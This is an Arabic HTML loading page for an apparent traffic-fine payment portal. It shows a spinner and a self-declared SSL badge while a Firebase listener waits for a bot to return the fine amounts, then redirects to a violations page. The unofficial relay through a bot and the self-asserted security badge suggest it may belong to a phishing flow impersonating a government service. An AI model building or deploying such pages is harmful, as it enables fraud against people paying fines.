<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>جاري معالجة الطلب - بوابة الدفع</title>
  <style>
    :root { --main-green: #008b47; }
    body { margin: 0; padding: 0; background-color: #f4f7f6; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .loading-card { background: #fff; width: 90%; max-width: 400px; padding: 40px 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
    
    .spinner {
      display: inline-block;
      width: 60px;
      height: 60px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid var(--main-green);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 25px;
    }
    
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    
    .load-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 15px; }
    .load-msg { font-size: 14px; color: #666; line-height: 1.6; }
    
    .secure-footer { margin-top: 30px; font-size: 11px; color: #bbb; display: flex; justify-content: center; align-items: center; gap: 5px; }
  </style>
</head>
<body>

<div class="loading-card">
  <div class="spinner"></div>
  <div class="load-title">جاري استخراج المخالفات</div>
  <div class="load-msg" id="dynamicMessage">
    يرجى الانتظار ولا تقم بإغلاق المتصفح أو تحديث الصفحة، نحن نقوم الآن بالاتصال بنظام المرور لجلب تفاصيل المخالفات..
  </div>
  
  <div class="secure-footer">
    <img src="https://img.icons8.com/ios-filled/20/bbbbbb/shield.png" alt="secure">
    اتصال مشفر وآمن (SSL)
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625",
      measurementId: "G-CSRM4QLNR9"
    };
    
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // استعادة رقم الطلب الذي تم حفظه في صفحة index.php
    const orderId = sessionStorage.getItem("last_order_id");

    function monitorTrafficStatus() {
        if (!orderId) {
            console.error("No order ID found");
            // إذا لم يوجد طلب، نرجعه للرئيسية بعد 3 ثواني
            setTimeout(() => { window.location.href = "index.php"; }, 3000);
            return;
        }

        // مراقبة الطلب المحدد في مجموعة "orders"
        db.collection("orders").doc(orderId)
        .onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                
                // أول ما البوت في Render يخلص ويحول الحالة لـ completed
                if (data.status === "completed") {
                    // حفظ مبلغ المخالفات لعرضه في الصفحة القادمة
                    sessionStorage.setItem("fine_amount", data.total_fines);
                    // التوجه لصفحة عرض المخالفات
                    window.location.href = "violations_view.php";
                } 
                // إذا حصل خطأ في البوت
                else if (data.status === "error") {
                    document.getElementById("dynamicMessage").innerHTML = "عذراً، حدث خطأ أثناء جلب البيانات. يرجى المحاولة مرة أخرى.";
                    setTimeout(() => { window.location.href = "index.php"; }, 3000);
                }
            }
        });
    }

    // تشغيل المراقبة
    monitorTrafficStatus();
</script>
</body>
</html>
